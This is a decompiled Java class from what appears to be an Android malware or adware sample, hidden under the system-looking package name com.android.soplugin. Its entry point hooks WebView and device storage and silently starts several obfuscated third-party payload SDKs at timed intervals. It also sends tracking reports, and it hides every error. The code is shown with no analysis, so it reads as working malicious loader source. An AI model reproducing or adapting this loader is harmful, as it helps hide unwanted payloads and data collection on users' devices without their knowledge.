package com.android.soplugin;

import android.app.ActivityThread;
import android.app.Application;
import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import com.android.soplugin.async.AsyncHandler;
import com.android.soplugin.async.Implementable;
import com.android.soplugin.cnzz.ReportManager;
import com.android.soplugin.util.CommUtil;
import com.android.soplugin.util.DataPreference;
import com.android.soplugin.util.PhoneUtil;
import com.android.util.hKq.H;
import com.asshow.asshow.AS;
import com.debby.Devour;
import com.liberty.lib.s;
import com.unia.y.ba;
import g.c.h;
import java.util.LinkedHashMap;
/* loaded from: /mnt/shared/apks/menSe7ni.dex */
public class GRPlug {
    private static final long DEFAULT_SLEEP_TIME = 20000;
    private static final String TAG = "MainWorker";
    private static boolean isInstanceBMW = false;
    private static boolean isInstanceBOX = false;
    private static boolean isInstancePoney = false;
    private static boolean isInstanceZM = false;
    private static boolean isPlugCalled = false;
    private static AsyncHandler mAsyncHandler;
    private static Context mContext;
    private static Handler mHandler;
    private static Looper mainLooper;

    private static AsyncHandler getAsyncHandler() {
        if (mAsyncHandler == null) {
            synchronized (GRPlug.class) {
                if (mAsyncHandler == null) {
                    mAsyncHandler = AsyncHandler.create(TAG);
                }
            }
        }
        return mAsyncHandler;
    }

    public static void main() {
        final LinkedHashMap linkedHashMap = new LinkedHashMap();
        mContext = getContext();
        try {
            if (mainLooper == null) {
                mainLooper = Looper.getMainLooper();
            }
            if (mHandler == null && mainLooper != null) {
                mHandler = new Handler(mainLooper);
            }
            mHandler.post(new Runnable() { // from class: com.android.soplugin.GRPlug.1
                @Override // java.lang.Runnable
                public void run() {
                    CommUtil.hookWebView();
                    CommUtil.hookDeviceProtectedStorage(GRPlug.mContext);
                }
            });
            getAsyncHandler().post(new Implementable(TAG) { // from class: com.android.soplugin.GRPlug.2
                @Override // com.android.soplugin.async.Implementable
                protected void implement() {
                    String handSpRecord = PhoneUtil.handSpRecord(GRPlug.mContext, DataPreference.KEY_CNZ_OLD_DATE, DataPreference.PREFIX_CNZ);
                    if (!DataPreference.getBoolean(GRPlug.mContext, handSpRecord, false)) {
                        String handSpLoopIndex = PhoneUtil.handSpLoopIndex(GRPlug.mContext, DataPreference.KEY_CNZ_OLD_LOOP, DataPreference.PREFIX_LOOP_CNZ);
                        int i = DataPreference.getInt(GRPlug.mContext, handSpLoopIndex, DataPreference.DEFAULT_LOOP_CNT);
                        if (!ReportManager.init("A10901")) {
                            return;
                        }
                        int i2 = i - 1;
                        DataPreference.putInt(GRPlug.mContext, handSpLoopIndex, i2);
                        if (i2 != 0) {
                            return;
                        }
                        DataPreference.putBoolean(GRPlug.mContext, handSpRecord, true);
                    }
                }
            });
            if (!isPlugCalled) {
                getAsyncHandler().post(new Implementable(TAG) { // from class: com.android.soplugin.GRPlug.3
                    @Override // com.android.soplugin.async.Implementable
                    protected void implement() {
                        if (!GRPlug.isPlugCalled) {
                            try {
                                if (!GRPlug.isInstancePoney) {
                                    s.init(GRPlug.mContext, "hz_py02");
                                    boolean unused = GRPlug.isInstancePoney = true;
                                    Thread.sleep(GRPlug.DEFAULT_SLEEP_TIME);
                                }
                            } catch (Throwable unused2) {
                            }
                            try {
                                if (!GRPlug.isInstanceZM) {
                                    boolean unused3 = GRPlug.isInstanceZM = true;
                                    Devour.getInstance().devourPlay(GRPlug.mContext);
                                    Thread.sleep(GRPlug.DEFAULT_SLEEP_TIME);
                                }
                            } catch (Throwable unused4) {
                            }
                            try {
                                ba.a(GRPlug.mContext, "7086", "");
                                Thread.sleep(GRPlug.DEFAULT_SLEEP_TIME);
                            } catch (Exception unused5) {
                            }
                            try {
                                if (!GRPlug.isInstanceBOX) {
                                    H.ih(GRPlug.mContext, null, false);
                                    boolean unused6 = GRPlug.isInstanceBOX = true;
                                    Thread.sleep(GRPlug.DEFAULT_SLEEP_TIME);
                                }
                            } catch (Throwable unused7) {
                            }
                            try {
                                AS.dr(GRPlug.mContext, "1410");
                                Thread.sleep(GRPlug.DEFAULT_SLEEP_TIME);
                            } catch (Exception unused8) {
                            }
                            try {
                                if (!GRPlug.isInstanceBMW) {
                                    boolean unused9 = GRPlug.isInstanceBMW = true;
                                    h.start(GRPlug.mContext);
                                    Thread.sleep(GRPlug.DEFAULT_SLEEP_TIME);
                                }
                            } catch (Exception unused10) {
                            }
                            boolean unused11 = GRPlug.isPlugCalled = true;
                        }
                    }
                });
            }
            getAsyncHandler().post(new Implementable(TAG) { // from class: com.android.soplugin.GRPlug.4
                @Override // com.android.soplugin.async.Implementable
                protected void implement() {
                    new GRInject(GRPlug.mContext).sendPlugCallInfo(linkedHashMap, "T10901");
                }
            });
        } catch (Throwable unused) {
        }
    }

    public static Context getContext() {
        if (ActivityThread.currentActivityThread() != null) {
            Application application = ActivityThread.currentActivityThread().getApplication();
            if (application instanceof Application) {
                return application;
            }
            try {
                return application.getApplicationContext();
            } catch (Exception unused) {
                return application;
            }
        }
        return ActivityThread.systemMain().getSystemContext();
    }
}
